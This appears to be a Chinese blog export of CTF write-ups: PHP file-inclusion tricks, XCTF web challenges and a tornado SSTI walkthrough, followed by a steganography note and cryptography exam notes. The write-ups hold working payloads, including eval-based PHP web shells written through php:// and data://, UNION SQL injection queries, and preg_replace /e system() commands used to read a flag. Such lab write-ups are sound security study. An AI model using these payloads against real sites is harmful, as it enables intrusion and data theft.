<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">payload:php://input</span><br><span class="line">然后以post方法传入&lt;?php fputs(fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>),<span class="string">"&lt;?php eval(\$_POST['shell']);?&gt;"</span>)?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="利用zip-、bzip-、zlib-协议"><a href="#利用zip-、bzip-、zlib-协议" class="headerlink" title="利用zip://、bzip://、zlib://协议"></a>利用zip://、bzip://、zlib://协议</h3><p>这三个协议在双off的情况下也可以正常使用，都属于压缩流，可以访问压缩文件中的子文件。<br>注意：压缩文件不一定是zip文件,只要是压缩文件就行<br>格式：zip://压缩文件绝对路径#压缩子文件文件名，’#’也可为’%23’</p>
<h3 id="利用phar-协议"><a href="#利用phar-协议" class="headerlink" title="利用phar://协议"></a>利用phar://协议</h3><p>类似于zip协议，但是可以使用相对路径<br>格式：phar://压缩文件绝对或相对路径/压缩文件子文件名</p>
<h3 id="利用data-协议"><a href="#利用data-协议" class="headerlink" title="利用data://协议"></a>利用data://协议</h3><p>将原本的include的文件流重定向到了用户可控的输入流中<br>必须在双off的情况下才能正常使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">payload:?file=data://text/plain,&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'shell'</span>]);?&gt;</span><br><span class="line">或者?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ3NoZWxsJ10pOz8+</span><br></pre></td></tr></table></figure>
<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>两个参数都要是on,allow_url_include在php5.2后默认为off<br>指定url文件<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/LFI.png" alt=""></p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>攻防世界-Web</title>
    <url>/2020/03/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web/</url>
    <content><![CDATA[<h3 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure>
<p>扫目录没结果，index.php也没结果<br>访问index.phps</p>
<a id="more"></a>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"admin"</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="built_in">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = urldecode(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">"admin"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"&lt;p&gt;Key: xxxxxxx &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>传入的id会先被urldecode解码，解码后等于admin<br>payload:<a href="http://111.198.29.45:43285/index.php?id=%2561dmin" target="_blank" rel="noopener">http://111.198.29.45:43285/index.php?id=%2561dmin</a></p>
<h3 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h3><p>上传upload.php文件，弹出警告框：请选择一个图片文件上传！<br>是js验证，直接关闭js<br>再次上传，发现上传按钮被锁定了<br>控制台执行submit.disabled=false<br>上传成功，用菜刀连接成功</p>
<h3 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h3><p>给了一个新闻搜索框，猜测是SQL注入<br>测试：1’ and 1=2 union select 1,2,3#<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/HackerNews.PNG" alt=""><br>测出注入点为2，3<br>爆数据库名：1’ and 1=2 union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.schemata)#<br>爆出数据库名为i：nformation_schema,news<br>应该在news中<br>爆表名：1’ and 1=2 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())#<br>爆出的表名为：news,secret_table<br>应该在secret_table表中<br>爆字段：1’ and 1=2 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=”secret_table”)#<br>爆出字段：id,fl4g<br>直接爆fl4g字段的值：1’ and 1=2 union select 1,2,(select group_concat(fl4g) from secret_table)#<br>拿到QCTF{sq1_inJec7ion_ezzz}</p>
<h3 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/isc_06_0.PNG" alt=""><br>只有报表中心点击出现页面跳转<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ics_06_1.PNG" alt=""><br>url中传参id,刚开始以为是sql注入，测试了好几次都没测出注入点<br>改了好几次id的值也都没发生变化，猜测是要对id的值进行爆破，直接上bp<br>1-10000开始爆破<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ics_06_2.PNG" alt=""></p>
<h3 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ics_05_0.PNG" alt=""><br>应该是文件包含漏洞<br>利用php伪协议<br>payload:php://filter/read=convert.base64-encode/resource=index.php<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ics_05_1.PNG" alt=""><br>base64解码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</span><br><span class="line">    <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</span><br><span class="line">    <span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="variable">$pattern</span>) &amp;&amp; isset(<span class="variable">$replacement</span>) &amp;&amp; isset(<span class="variable">$subject</span>)) &#123;</span><br><span class="line">        preg_replace(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本地登陆,伪造XFF<br>然后就是preg_replace函数的执行漏洞了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">功能 ： 函数执行一个正则表达式的搜索和替换</span><br><span class="line"></span><br><span class="line">定义 ： mixed preg_replace ( mixed <span class="variable">$pattern</span> , mixed <span class="variable">$replacement</span> , mixed <span class="variable">$subject</span> [, int <span class="variable">$limit</span> = -1 [, int &amp;<span class="variable">$count</span> ]] )</span><br><span class="line"></span><br><span class="line">搜索 subject 中匹配 pattern 的部分， 如果匹配成功以 replacement 进行替换</span><br></pre></td></tr></table></figure>
<h4 id="函数代码执行漏洞"><a href="#函数代码执行漏洞" class="headerlink" title="函数代码执行漏洞"></a>函数代码执行漏洞</h4><p>$pattern 存在 /e 模式修正符，允许代码执行<br>/e 模式修正符，是 preg_replace() 将 $replacement 当做php代码来执行<br>参考文章:<a href="https://www.freebuf.com/column/182130.html" target="_blank" rel="noopener">https://www.freebuf.com/column/182130.html</a></p>
<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><p>payload:?pat=/file/e&amp;rep=system(“ls”)&amp;sub=file<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ics_05_2.PNG" alt=""><br>flag应该在s3chahahaDir中</p>
<h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p>”+“号在url中会被解释成空格号，这里用%20也行<br>payload:?pat=/file/e&amp;rep=system(“ls+s3chahahaDir”)&amp;sub=file<br><img src="https://gitee.com/zxfireworks/BlogPic/blob/master/ics_05_3.PNG" alt=""><br>继续打开flag</p>
<h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p>payload:?pat=/file/e&amp;rep=system(“ls+s3chahahaDir/flag”)&amp;sub=file<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ics_05_4.PNG" alt=""><br>出现flag.php，直接cat</p>
<h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><p>payload:?pat=/file/e&amp;rep=system(“cat+s3chahahaDir/flag/flag.php”)&amp;sub=file<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ics_05_5.PNG" alt=""></p>
<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$miwen</span>=<span class="string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> encode(<span class="variable">$str</span>)&#123;</span><br><span class="line">    <span class="variable">$_o</span>=strrev(<span class="variable">$str</span>);</span><br><span class="line">    // <span class="built_in">echo</span> <span class="variable">$_o</span>;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$_0</span>=0;<span class="variable">$_0</span>&lt;strlen(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="variable">$_c</span>=substr(<span class="variable">$_o</span>,<span class="variable">$_0</span>,1);</span><br><span class="line">        <span class="variable">$__</span>=ord(<span class="variable">$_c</span>)+1;</span><br><span class="line">        <span class="variable">$_c</span>=chr(<span class="variable">$__</span>);</span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$_c</span>;   </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">return</span> str_rot13(strrev(base64_encode(<span class="variable">$_</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">/*</span><br><span class="line">   逆向加密算法，解密<span class="variable">$miwen</span>就是flag</span><br><span class="line">*/</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>密文rot13解码后为：n1mYotDfPRFRVdEYjhDNlZjYld2Y5IjOkdTN3EDNlhzM0gzZiFTZ2MjO4gjf</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">rot13_decode=<span class="string">"n1mYotDfPRFRVdEYjhDNlZjYld2Y5IjOkdTN3EDNlhzM0gzZiFTZ2MjO4gjf"</span></span><br><span class="line">res=rot13_decode[::-1]</span><br><span class="line">base64=base64.b64decode(res.encode(<span class="string">"utf-8"</span>)).decode(<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line">def decode(strings):</span><br><span class="line">    now=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(strings)):</span><br><span class="line">        tmp=strings[i]</span><br><span class="line">        tmp_ord=ord(tmp)-1</span><br><span class="line">        tmp_chr=chr(tmp_ord)</span><br><span class="line">        now+=tmp_chr</span><br><span class="line">    flag=now[::-1]</span><br><span class="line">    <span class="built_in">return</span> flag</span><br><span class="line"><span class="built_in">print</span>(decode(base64))</span><br></pre></td></tr></table></figure>
<p>解密后为:<br>flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977}</p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>攻防世界-Misc</title>
    <url>/2020/02/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Misc/</url>
    <content><![CDATA[<h2 id="Avatar"><a href="#Avatar" class="headerlink" title="Avatar"></a>Avatar</h2><p>需要一个没听过的工具outguess</p>

<h3 id="安装outguess"><a href="#安装outguess" class="headerlink" title="安装outguess"></a>安装outguess</h3><p>Kali终端命令输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/crorvick/outguess</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>下载安装包后，进入该安装包文件夹，用终端打开<br>输入安装命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./configure &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
<p>对图片信息进行破解的命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">outguess -r /root/***.jpg -t **.txt</span><br></pre></td></tr></table></figure>
<p>其中<strong>*.jpg是待解密图片，解密后的数据输入到</strong>.txt中</p>
]]></content>
      <categories>
        <category>CTF-Misc</category>
      </categories>
  </entry>
  <entry>
    <title>服务端模板注入(SSTI)</title>
    <url>/2020/04/03/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5SSTI/</url>
    <content><![CDATA[<h3 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h3><p>一道关于python模板框架tornado的SSTI漏洞题</p>
<a id="more"></a>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_tornado/easy_tornado/t0.PNG" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_tornado/easy_tornado/t1.PNG" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_tornado/easy_tornado/t2.PNG" alt=""><br>看到渲染函数render，就能反应出这里可能存在SSTI<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_tornado/easy_tornado/t3.PNG" alt=""><br>filename应该就是/fllllllllllllag<br>此时的url为<a href="http://9d100937-275b-4b51-80bc-3a4e384f8d83.node3.buuoj.cn/file?filename=/hints.txt&amp;filehash=fa535effc38df8fb5ea22374d7564814" target="_blank" rel="noopener">http://9d100937-275b-4b51-80bc-3a4e384f8d83.node3.buuoj.cn/file?filename=/hints.txt&amp;filehash=fa535effc38df8fb5ea22374d7564814</a><br>md5(cookie_secret+md5(filename))的结果应该就是filehash的值，接下来就是要拿到cookie_secret的值<br>修改参数filename=/fllllllllllllag<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_tornado/easy_tornado/t4.PNG" alt=""><br>有回显，并且参数msg的值就是回显内容，这里可能存在SSTI漏洞，测试了一下<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_tornado/easy_tornado/t5.PNG" alt=""><br>返回ORZ,说明存在过滤<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_tornado/easy_tornado/t6.PNG" alt=""><br>测试1和2^3都正确回显，确定此处存在SSTI<br>在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了<br>获取cookie_secret的payload:<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_tornado/easy_tornado/t7.PNG" alt=""><br>拿到了cookie_secret,接下来计算hash值md5(cookie_secret+md5(filename))=b3b51a763ef182a4f1066ce08df7b518<br>最终payload:?filename=/fllllllllllllag&amp;filehash=b3b51a763ef182a4f1066ce08df7b518<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_tornado/easy_tornado/t8.PNG" alt=""></p>
<p>SSTI(服务端模板注入)是指服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。</p>
<p>主要框架<br>python：jinja2 mako tornado django<br>PHP：smarty twig<br>java：jade velocity<br>模板类型判断<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_tornado/easy_tornado/t9.jpg" alt=""></p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>现代密码学期末复习</title>
    <url>/2020/06/22/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="第一章-引言"><a href="#第一章-引言" class="headerlink" title="第一章 (引言)"></a>第一章 (引言)</h3><h4 id="清楚信息安全专业学习密码学的原因"><a href="#清楚信息安全专业学习密码学的原因" class="headerlink" title="清楚信息安全专业学习密码学的原因"></a>清楚信息安全专业学习密码学的原因</h4><p>0、密码技术是信息安全的核心技术<br>1、密码技术已经广泛应用于通信保密、信息系统安全、网络安全、云计算安全、区块链安全等多个信息安全的重要领域中</p>
<h3 id="第二章-流密码"><a href="#第二章-流密码" class="headerlink" title="第二章 (流密码)"></a>第二章 (流密码)</h3><h4 id="掌握流密码的基本思想"><a href="#掌握流密码的基本思想" class="headerlink" title="掌握流密码的基本思想"></a>掌握流密码的基本思想</h4><p>流密码的基本思想是利用密钥k产生一个密钥流z=z0z1…,并使用如下规则对明文串x=x0x1x2…加密：y=y0y1y2…=Ez0(x0)Ez1(x1)Ez2(x2)…。密钥流由密钥流发生器产生：zi=f(k,σi),这里σi是加密器中的记忆元件(存储器)在时刻i的状态,f是由密钥k和σi产生的函数</p>
<a id="more"></a>
<h3 id="第三章-分组密码"><a href="#第三章-分组密码" class="headerlink" title="第三章 (分组密码)"></a>第三章 (分组密码)</h3><h4 id="理解分组密码的CBC工作模式，能够画出该模式的加密示意图"><a href="#理解分组密码的CBC工作模式，能够画出该模式的加密示意图" class="headerlink" title="理解分组密码的CBC工作模式，能够画出该模式的加密示意图"></a>理解分组密码的CBC工作模式，能够画出该模式的加密示意图</h4><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ClassNote/CBC.jpg" alt=""></p>
<h4 id="能够根据给定的一个字节a-给定的AES仿射变换-和不可约多项式m-x-，求出字节a在AES中S盒字节代替变换的结果"><a href="#能够根据给定的一个字节a-给定的AES仿射变换-和不可约多项式m-x-，求出字节a在AES中S盒字节代替变换的结果" class="headerlink" title="能够根据给定的一个字节a,给定的AES仿射变换(*)和不可约多项式m(x)，求出字节a在AES中S盒字节代替变换的结果"></a>能够根据给定的一个字节a,给定的AES仿射变换(*)和不可约多项式m(x)，求出字节a在AES中S盒字节代替变换的结果</h4><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ClassNote/Sbox.jpg" alt=""><br>考试中求逆时，不需要使用欧几里得算法，直接一个一个试就行了(老师说给的逆很容易试出来)</p>
<h3 id="第四章-公钥密码"><a href="#第四章-公钥密码" class="headerlink" title="第四章 (公钥密码)"></a>第四章 (公钥密码)</h3><h4 id="能够根据RSA算法进行加密与解密计算"><a href="#能够根据RSA算法进行加密与解密计算" class="headerlink" title="能够根据RSA算法进行加密与解密计算"></a>能够根据RSA算法进行加密与解密计算</h4><p>选两个保密的大素数p和q<br>计算n=p<em>q，φ(n)=(p-1)(q-1),其中φ(n)是n的欧拉函数值<br>选一整数e，满足1 &lt; e &lt; φ(n)，且gcd(φ(n),e)=1，这里的(e,n)就是公钥<br>计算d，满足d</em>e ≡ 1 mod(φ(n))，这里的(d,n)就是私钥<br>加密过程：对于明文m，c ≡ (m^e) mod(n)，c就是m加密后的密文<br>解密过程：m ≡ (c^d) mod(n)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a*b(mod q)=a(mod q) * b(mod q)</span><br></pre></td></tr></table></figure>
<h3 id="第五章-数字签名"><a href="#第五章-数字签名" class="headerlink" title="第五章 (数字签名)"></a>第五章 (数字签名)</h3><h4 id="能够使用Elgamal数字签名体制，进行签名与验证计算"><a href="#能够使用Elgamal数字签名体制，进行签名与验证计算" class="headerlink" title="能够使用Elgamal数字签名体制，进行签名与验证计算"></a>能够使用Elgamal数字签名体制，进行签名与验证计算</h4><p>选取大素数p，生成元g，p、g公开<br>随机选取整数x，1 ≤ x ≤ p-2，计算y ≡ g^x mod(p)<br>公钥为y，私钥为x<br>签名算法：对于消息m，随机选取整数k，1 ≤ k ≤ p-2，计算r=g^k mod(p)，s=(H(m)-x<em>r)k^(-1) mod(p-1)<br>注意：这里的k^-1是k的逆，不是倒数,即k*k^-1 ≡ 1 mod(p-1)<br>m的签名为(r,s)，其中H为Hash函数，老师说考试直接用m来代替H(m)进行计算<br>验证算法：接收到消息m和签名(r,m)后，验证(y^r)</em>(r^s) ≡ g^H(m) mod(p)<br>如果成立则签名有效，反之签名无效</p>
<h3 id="第六章-哈希函数"><a href="#第六章-哈希函数" class="headerlink" title="第六章 (哈希函数)"></a>第六章 (哈希函数)</h3><h4 id="理解弱单向函数与强单向函数的定义"><a href="#理解弱单向函数与强单向函数的定义" class="headerlink" title="理解弱单向函数与强单向函数的定义"></a>理解弱单向函数与强单向函数的定义</h4><p>单向函数：已知h,求H(x)=h的x在计算上是不可行的，这一性质称为函数的单向性<br>弱单向函数：已知x,找出y(y≠x)使得H(y)=H(x)在计算上是不可行的<br>强单向函数：找出任意两个不同的输入x、y,使得H(y)=H(x)在计算上是不可行的</p>
<h3 id="第八章-密钥分配与密钥管理"><a href="#第八章-密钥分配与密钥管理" class="headerlink" title="第八章 (密钥分配与密钥管理)"></a>第八章 (密钥分配与密钥管理)</h3><h4 id="能够基于D-H密钥交换协议计算生成通信双方的共享密钥"><a href="#能够基于D-H密钥交换协议计算生成通信双方的共享密钥" class="headerlink" title="能够基于D-H密钥交换协议计算生成通信双方的共享密钥"></a>能够基于D-H密钥交换协议计算生成通信双方的共享密钥</h4><p><a href="https://zxfireworks.xyz/2020/02/26/%E5%AF%86%E7%A0%81%E5%AD%A6/" target="_blank" rel="noopener">https://zxfireworks.xyz/2020/02/26/%E5%AF%86%E7%A0%81%E5%AD%A6/</a></p>
<h3 id="第九章-密码协议"><a href="#第九章-密码协议" class="headerlink" title="第九章 (密码协议)"></a>第九章 (密码协议)</h3><h4 id="了解密码协议的定义"><a href="#了解密码协议的定义" class="headerlink" title="了解密码协议的定义"></a>了解密码协议的定义</h4><p>密码协议是指利用密码工具实现与安全相关的协议或函数的计算</p>
<h3 id="第十章-可证明安全"><a href="#第十章-可证明安全" class="headerlink" title="第十章 (可证明安全)"></a>第十章 (可证明安全)</h3><h4 id="了解可证明安全的思想"><a href="#了解可证明安全的思想" class="headerlink" title="了解可证明安全的思想"></a>了解可证明安全的思想</h4><p>利用概率论和计算复杂性理论，把对密码系统的安全性归约到已知的数学困难问题上。这个评估方法只是说明了这个密码算法的安全性与某个困难问题相关，没有完全证明问题本身的安全性，并给出它们的等价性证明</p>
<h3 id="第十一章-密码学新方向"><a href="#第十一章-密码学新方向" class="headerlink" title="第十一章 (密码学新方向)"></a>第十一章 (密码学新方向)</h3><h4 id="能够知道5种密码学新方向或新技术"><a href="#能够知道5种密码学新方向或新技术" class="headerlink" title="能够知道5种密码学新方向或新技术"></a>能够知道5种密码学新方向或新技术</h4><p>0、身份基加密<br>1、属性基加密<br>2、全同态加密<br>3、后量子密码<br>4、DNA密码<br>5、混沌密码</p>
<h3 id="综合"><a href="#综合" class="headerlink" title="综合"></a>综合</h3><h4 id="介绍一种安全应用场景，分析该安全场景应用了哪些密码技术，并简述如何保障了安全性"><a href="#介绍一种安全应用场景，分析该安全场景应用了哪些密码技术，并简述如何保障了安全性" class="headerlink" title="介绍一种安全应用场景，分析该安全场景应用了哪些密码技术，并简述如何保障了安全性"></a>介绍一种安全应用场景，分析该安全场景应用了哪些密码技术，并简述如何保障了安全性</h4><p>安全场景：银行系统中基于PKI的USB Key身份认证系统<br>密码技术：公钥密码体制、身份认证<br>基于PKI的”数字证书认证方式”可以有效地保证用户的身份安全和数据传输安全。在USBKey内用私钥将原文加密，与原文和数字证书一起打包通过网络传输，服务器端接收到后还原出数字证书，利用公钥解密，结果与原文校验，确定用户合法性。而数字证书存储在USBKey中可以保障数字证书无法被复制，所有密钥运算在USBKey中实现，用户密钥不在计算机内存出现也不在网络中传播，只有USBKey的持有人才能够对数字证书进行操作</p>
]]></content>
      <categories>
        <category>课程笔记</category>
      </categories>
  </entry>
</search>
